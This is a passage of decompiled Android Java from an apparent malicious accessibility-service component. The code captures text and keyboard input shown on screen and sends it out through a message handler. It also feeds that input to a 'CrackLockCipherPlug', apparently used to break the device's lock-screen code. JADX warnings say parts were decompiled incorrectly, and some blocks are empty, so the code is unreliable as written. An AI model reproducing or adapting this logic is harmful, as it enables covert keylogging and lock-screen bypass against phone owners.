        } catch (Exception e2) {
            AbstractC0026q.m186s("AccessibilityDelegate", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:104:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:108:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:47:0x014d A[Catch: Exception -> 0x0294, TryCatch #4 {Exception -> 0x0294, blocks: (B:45:0x0147, B:47:0x014d, B:49:0x0161, B:51:0x016f, B:53:0x017d, B:55:0x018b, B:61:0x01a1, B:70:0x01be, B:74:0x019b, B:75:0x01c1, B:77:0x01cf, B:81:0x0205, B:83:0x023a, B:86:0x0246, B:87:0x0251, B:89:0x025f, B:91:0x0269, B:95:0x0275, B:97:0x027b, B:99:0x0285, B:105:0x01e0, B:107:0x01e6, B:63:0x01a5, B:65:0x01ab, B:67:0x01b1, B:57:0x018f, B:59:0x0195), top: B:44:0x0147, inners: #2, #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x01a1 A[Catch: Exception -> 0x0294, TRY_LEAVE, TryCatch #4 {Exception -> 0x0294, blocks: (B:45:0x0147, B:47:0x014d, B:49:0x0161, B:51:0x016f, B:53:0x017d, B:55:0x018b, B:61:0x01a1, B:70:0x01be, B:74:0x019b, B:75:0x01c1, B:77:0x01cf, B:81:0x0205, B:83:0x023a, B:86:0x0246, B:87:0x0251, B:89:0x025f, B:91:0x0269, B:95:0x0275, B:97:0x027b, B:99:0x0285, B:105:0x01e0, B:107:0x01e6, B:63:0x01a5, B:65:0x01ab, B:67:0x01b1, B:57:0x018f, B:59:0x0195), top: B:44:0x0147, inners: #2, #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x025f A[Catch: Exception -> 0x0294, TryCatch #4 {Exception -> 0x0294, blocks: (B:45:0x0147, B:47:0x014d, B:49:0x0161, B:51:0x016f, B:53:0x017d, B:55:0x018b, B:61:0x01a1, B:70:0x01be, B:74:0x019b, B:75:0x01c1, B:77:0x01cf, B:81:0x0205, B:83:0x023a, B:86:0x0246, B:87:0x0251, B:89:0x025f, B:91:0x0269, B:95:0x0275, B:97:0x027b, B:99:0x0285, B:105:0x01e0, B:107:0x01e6, B:63:0x01a5, B:65:0x01ab, B:67:0x01b1, B:57:0x018f, B:59:0x0195), top: B:44:0x0147, inners: #2, #3 }] */
    /* renamed from: x */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m1083x(EventSubscribe eventSubscribe, ArrayList arrayList, String str, String str2, Long l2) {
        String str3;
        boolean isNeedReply;
        MessageRecordVO messageRecordVO;
        boolean z2;
        Iterator it;
        Iterator<String> it2;
        String str4 = str;
        ConcurrentHashMap concurrentHashMap = this.f867f;
        if (eventSubscribe.getListenProps() == null || eventSubscribe.getListenProps().isEmpty()) {
            return;
        }
        LinkedList linkedList = new LinkedList();
        String str5 = "GESTURE_POINTS";
        try {
            if (!arrayList.isEmpty()) {
                Iterator it3 = arrayList.iterator();
                int i2 = 0;
                while (it3.hasNext()) {
                    UiObject uiObject = (UiObject) it3.next();
                    Iterator<String> it4 = eventSubscribe.getListenProps().iterator();
                    while (it4.hasNext()) {
                        String next = it4.next();
                        if (AbstractC0026q.m151B(next) || Objects.equals(next, str5) || Objects.equals(next, "TOUCH_POINT")) {
                            str3 = str5;
                            it = it3;
                            it2 = it4;
                        } else {
                            it = it3;
                            if (!Objects.equals(next, TextBundle.TEXT_ENTRY) || AbstractC0026q.m151B(str)) {
                                str3 = str5;
                                it2 = it4;
                            } else {
                                StringBuilder sb = new StringBuilder();
                                it2 = it4;
                                sb.append("监听到前置属性:");
                                sb.append(next);
                                sb.append(":");
                                sb.append(str4);
                                Log.d("AccessibilityDelegate", sb.toString());
                                str3 = str5;
                                try {
                                    linkedList.add(new ListenPropResponse(Integer.valueOf(i2), next, str4.replaceAll("•", "*"), eventSubscribe.getEventTimestamp()));
                                } catch (Exception e2) {
                                    e = e2;
                                    AbstractC0026q.m186s("AccessibilityDelegate:postListenProps", e);
                                    if (!linkedList.isEmpty()) {
                                    }
                                }
                            }
                            if (Objects.equals(next, TextBundle.TEXT_ENTRY) && !AbstractC0026q.m151B(str2)) {
                                Log.d("AccessibilityDelegate", "监听到键盘属性:" + next + ":" + str2);
                                linkedList.add(new ListenPropResponse(Integer.valueOf(i2), next, str2.replaceAll("•", "*"), eventSubscribe.getEventTimestamp()));
                            }
                            String property = uiObject.getProperty(next);
                            if (!AbstractC0026q.m151B(property)) {
                                Log.d("AccessibilityDelegate", "监听到属性:" + next + ":" + property);
                                linkedList.add(new ListenPropResponse(Integer.valueOf(i2), next, property.replaceAll("•", "*"), eventSubscribe.getEventTimestamp()));
                            }
                        }
                        it3 = it;
                        str4 = str;
                        it4 = it2;
                        str5 = str3;
                    }
                    i2++;
                    str4 = str;
                }
            }
            str3 = str5;
        } catch (Exception e3) {
            e = e3;
            str3 = str5;
        }
        try {
            if (!linkedList.isEmpty()) {
                return;
            }
            if (!Objects.equals(eventSubscribe.getListenType(), 0) && !Objects.equals(eventSubscribe.getListenType(), 1) && !Objects.equals(eventSubscribe.getListenType(), 8) && !Objects.equals(eventSubscribe.getListenType(), 9)) {
                String id = eventSubscribe.getId();
                try {
                } catch (Exception e4) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e4);
                }
                if (!AbstractC0026q.m151B(id)) {
                    z2 = concurrentHashMap.containsKey(id);
                    if (!z2) {
                        String id2 = eventSubscribe.getId();
                        try {
                            if (!AbstractC0026q.m151B(id2) && !concurrentHashMap.containsKey(id2)) {
                                concurrentHashMap.put(id2, Long.valueOf(System.currentTimeMillis()));
                            }
                        } catch (Exception e5) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e5);
                        }
                    }
                }
                z2 = false;
                if (!z2) {
                }
            }
            if (!Objects.equals(eventSubscribe.getListenType(), 8) && !Objects.equals(eventSubscribe.getListenType(), 9)) {
                isNeedReply = true;
                ListenResponseVO listenResponseVO = new ListenResponseVO();
                listenResponseVO.setBatchId(String.valueOf(l2));
                listenResponseVO.setSubscribeId(eventSubscribe.getId());
                listenResponseVO.setListenId(eventSubscribe.getListenId());
                listenResponseVO.setDelegateId(this.f864c);
                listenResponseVO.setResponses(linkedList);
                messageRecordVO = new MessageRecordVO();
                messageRecordVO.setExtraBody(listenResponseVO);
                messageRecordVO.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
                if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null && isNeedReply) {
                    MainApplication.getInstance().getHandlerMsgAndTimer().m578a(messageRecordVO);
                }
                if (Objects.equals(eventSubscribe.getListenType(), 1)) {
                    return;
                }
                if ((!AbstractC0026q.m151B(eventSubscribe.getHelperProp()) && !Objects.equals(eventSubscribe.getHelperProp(), str3)) || MainApplication.getInstance() == null || MainApplication.getInstance().getCrackLockCipherPlug() == null) {
                    return;
                }
                MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                C0224c.m454j(listenResponseVO);
                return;
            }
            isNeedReply = eventSubscribe.isNeedReply();
            if (isNeedReply) {
                Log.d("AccessibilityDelegate", "postListenProps 有需要响应的前置订阅,需要上传监听结果" + eventSubscribe.getListenProps().toString());
                m1085z(eventSubscribe);
            }
            ListenResponseVO listenResponseVO2 = new ListenResponseVO();
            listenResponseVO2.setBatchId(String.valueOf(l2));
            listenResponseVO2.setSubscribeId(eventSubscribe.getId());
            listenResponseVO2.setListenId(eventSubscribe.getListenId());
            listenResponseVO2.setDelegateId(this.f864c);
            listenResponseVO2.setResponses(linkedList);
            messageRecordVO = new MessageRecordVO();
            messageRecordVO.setExtraBody(listenResponseVO2);
            messageRecordVO.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().m578a(messageRecordVO);
            }
            if (Objects.equals(eventSubscribe.getListenType(), 1)) {
            }
        } catch (Exception e6) {
            AbstractC0026q.m186s("AccessibilityDelegate", e6);
        }
    }

    /* renamed from: y */
    public final SearchNodeResultVO m1084y(int i2, String str) {
        if (i2 < 0) {
            i2 = 0;
        }
        try {
            UiObject m1074m = m1074m(i2, str);
            if (m1074m != null) {
                m1074m.refresh();
                try {
                    if (AbstractC0026q.m151B(str)) {
                        str = String.valueOf(this.f863b.m723a());
                    }
                    this.f874m.put(str, m1074m);
                    return new SearchNodeResultVO(str, new UiObjectVO(m1074m));
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    return null;
                }
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("AccessibilityDelegate", e3);
        }
        return null;
    }

    /* renamed from: z */
    public final void m1085z(EventSubscribe eventSubscribe) {
        try {
            if (eventSubscribe.getReplySubscribes() == null || eventSubscribe.getReplySubscribes().isEmpty()) {
                return;
            }
            for (String str : eventSubscribe.getReplySubscribes()) {
                try {
                    if (!AbstractC0026q.m151B(str)) {
                        this.f867f.remove(str);
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e2);
                }
            }
        } catch (Exception e3) {
            AbstractC0026q.m186s("AccessibilityDelegate", e3);
        }
    }
}
